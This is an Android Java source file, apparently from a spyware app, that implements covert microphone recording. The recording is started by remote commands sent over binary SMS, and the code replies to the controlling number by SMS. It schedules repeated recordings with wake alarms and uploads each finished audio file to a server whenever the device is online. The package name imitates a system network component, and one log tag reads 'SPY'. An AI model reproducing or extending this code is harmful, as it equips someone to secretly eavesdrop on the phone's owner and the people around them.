package com.android.network.detect;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.StatFs;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Locale;
import java.util.TimeZone;

public class RecorderHelpers extends ContextWrapper implements
        CustomMediaRecorder.OnNewFileWrittenListener,
        CustomMediaRecorder.OnRecordingStateChangedListener {

    private final String LOG_TAG = AppGlobals.getLogTag(getClass());
    private static CustomMediaRecorder sRecorder;
    private static PendingIntent pendingIntent;
    private static AlarmManager alarmManager;
    private final int FIFTEEN_MINUTES = 15 * 1000 * 60;
    private int mCompleteRepeats;
    private float mPartialRepeats;
    private int mRecordingGap;
    private int mRecordingInstance;
    private int mSplitFull;
    private float mSplitPartial;
    private int mSplitDuration;
    private boolean mScheduleEnded;
    private boolean mStoppedWithInDirectCommand;
    private static boolean sIsRecordAlarmSet;

    private BroadcastReceiver mScheduledRecordingsReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            setIsRecordAlarmSet(false);
            int time = intent.getExtras().getInt("RECORD_TIME", mRecordingInstance);
            startRecording(time);
        }
    };

    public RecorderHelpers(Context base) {
        super(base);
    }

    private static void setIsRecordAlarmSet(boolean set) {
        sIsRecordAlarmSet = set;
    }

    static boolean isRecordAlarmSet() {
        return sIsRecordAlarmSet;
    }

    private void startRecording(int time) {
        if (CustomMediaRecorder.isRecording()) {
            Log.i("SPY", "Recording already in progress");
            return;
        }

        if (!isAvailableSpacePercentageAbove(10)) {
            if (Helpers.originatingAddress != null) {
                Helpers.sendDataSmsResponse(
                        Helpers.originatingAddress,
                        BinarySmsReceiver.responsePort,
                        "Low disk space, stopped recording.");
            }
            Helpers.resetAllRecordTimes();
            stopService(new Intent(getApplicationContext(), DetectorService.class));
            return;
        }
        String path = AppGlobals.getAppDataDirectory() + getTimeStamp() + ".aac";
        sRecorder = CustomMediaRecorder.getInstance();
        sRecorder.reset();
        sRecorder.setOnNewFileWrittenListener(this);
        sRecorder.setOnRecordingStateChangedListener(this);
        sRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        sRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        sRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        sRecorder.setAudioEncodingBitRate(16000);
        sRecorder.setDuration(time);
        sRecorder.setOutputFile(path);

        try {
            sRecorder.prepare();
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.out.println("Recording for: " + time);
        sRecorder.start();
        AppGlobals.saveLastRecordingFilePath(path);
    }

    void startRecording(int time, int splitDuration) {
        if (splitDuration == 0 && time < FIFTEEN_MINUTES) {
            startRecording(time);
        } else if (splitDuration == 0 && time > FIFTEEN_MINUTES) {
            mSplitDuration = FIFTEEN_MINUTES;
            float parts = (float) time / (float) mSplitDuration;
            mSplitFull = (int) parts;
            mSplitPartial = parts - mSplitFull;
            startRecording(mSplitDuration);
            Log.v(LOG_TAG, String.format("Complete repeats %d", mSplitFull));
            Log.v(LOG_TAG, String.format("Partial repeats %f", mSplitPartial));
        }
    }

    void startRecording(int totalTime, int gapInterval, int recordingInstance) {
        IntentFilter filter = new IntentFilter("com.byteshaft.startAlarm");
        getApplicationContext().registerReceiver(mScheduledRecordingsReceiver, filter);
        mRecordingGap = gapInterval;
        float parts = (float) totalTime / (float) recordingInstance;
        mCompleteRepeats = (int) parts;
        mPartialRepeats = parts - mCompleteRepeats;
        mRecordingInstance = recordingInstance;
        startRecording(mRecordingInstance);
        mCompleteRepeats--;
        Log.v(LOG_TAG, String.format("Complete repeats %d", mCompleteRepeats));
        Log.v(LOG_TAG, String.format("Partial repeats %f", mPartialRepeats));
    }

     void stopRecording() {
        if (CustomMediaRecorder.isRecording()) {
            sRecorder.stop();
            sRecorder.reset();
            sRecorder.release();
            cancelAlarm();
            sRecorder = null;
        }
    }

    void stopRecording(boolean actInDirect) {
        mStoppedWithInDirectCommand = actInDirect;
        stopRecording();
    }

    void createRecordingDirectoryIfNotAlreadyCreated() {
        File recordingsDirectory = new File(AppGlobals.getAppDataDirectory());
        if (!recordingsDirectory.exists()) {
            recordingsDirectory.mkdirs();
        }
    }

    static void cancelAlarm() {
        if (alarmManager != null && pendingIntent != null) {
            alarmManager.cancel(pendingIntent);
        }
        setIsRecordAlarmSet(false);
    }

    private String getTimeStamp() {
        TimeZone timeZone = TimeZone.getTimeZone("UTC");
        Calendar calendar = Calendar.getInstance(timeZone);
        SimpleDateFormat simpleDateFormat =
                new SimpleDateFormat("yyyyMMddHHmmss", Locale.UK);
        simpleDateFormat.setTimeZone(timeZone);
        return "." + simpleDateFormat.format(calendar.getTime());
    }

    @Override
    public void onNewRecordingCompleted(String path) {
        CheckInternetAndUpload checkInternet = new CheckInternetAndUpload(getApplicationContext());
        UploadRecordingTaskHelpers uploadRecordingTaskHelpers
                = new UploadRecordingTaskHelpers(getApplicationContext());
        if (uploadRecordingTaskHelpers.isNetworkAvailable()) {
            checkInternet.setCurrentUplaodFile(path);
            new Thread(checkInternet).start();
        } else {
            RecordingDatabaseHelper recordingHelper = new RecordingDatabaseHelper
                    (getApplicationContext());
            recordingHelper.createNewEntry(SqliteHelpers.COULMN_UPLOAD, path);
        }
    }

    @Override
    public void onStop(int stopper, String fileName) {
        switch (stopper) {
            case AppGlobals.STOPPED_AFTER_TIME:
                Log.v(LOG_TAG, String.format("Complete repeats %d", mCompleteRepeats));
                Log.v(LOG_TAG, String.format("Partial repeats %f", mPartialRepeats));
                if (mCompleteRepeats > 0) {
                    Intent intent = new Intent("com.byteshaft.startAlarm");
                    setAlarmedRecording(intent);
                    mCompleteRepeats--;
                    mScheduleEnded = true;
                    return;
                } else if (mPartialRepeats > 0) {
                    int time = (int) (mRecordingInstance * mPartialRepeats);
                    System.out.println("Alarm for " + time);
                    Intent intent = new Intent("com.byteshaft.startAlarm");
                    intent.putExtra("RECORD_TIME", time);
                    setAlarmedRecording(intent);
                    mPartialRepeats = 0;
                    mScheduleEnded = true;
                    return;
                }

                if (mScheduleEnded) {
                    if (Helpers.originatingAddress != null) {
                        Helpers.sendDataSmsResponse(
                                Helpers.originatingAddress,
                                BinarySmsReceiver.responsePort,
                                "Recording Stopped. Schedule Completed."
                        );
                        return;
                    }
                }

                Log.v(LOG_TAG, String.format("Complete repeats %d", mSplitFull));
                Log.v(LOG_TAG, String.format("Partial repeats %f", mSplitPartial));
                if (mSplitFull > 0) {
                    startRecording(mSplitDuration);
                    mSplitFull--;
                    return;
                }
                if (mSplitPartial > 0) {
                    startRecording((int) (mSplitDuration * mSplitPartial));
                    mSplitPartial = 0;
                    break;
                }
                break;
            case AppGlobals.STOPPED_WITH_DIRECT_CALL:
                if (!mStoppedWithInDirectCommand) {
                    Helpers.resetAllRecordTimes();
                }
                break;
            case AppGlobals.SERVER_DIED:
                break;
        }
    }

    private void setAlarmedRecording(Intent intent) {
        Log.v(LOG_TAG, String.format("Setting recording alarm for %d", mRecordingGap));
        pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + mRecordingGap, pendingIntent);
        setIsRecordAlarmSet(true);
    }

    static boolean isAvailableSpacePercentageAbove(int percent) {
        StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
        double sdAvailSize = stat.getAvailableBlocks() * (double) stat.getBlockSize();
        double sdTotalSize = stat.getBlockCount() * (double) stat.getBlockSize();

        //One binary gigabyte equals 1,073,741,824 bytes.
        return  (sdAvailSize / sdTotalSize) * 100 > percent;
    }
}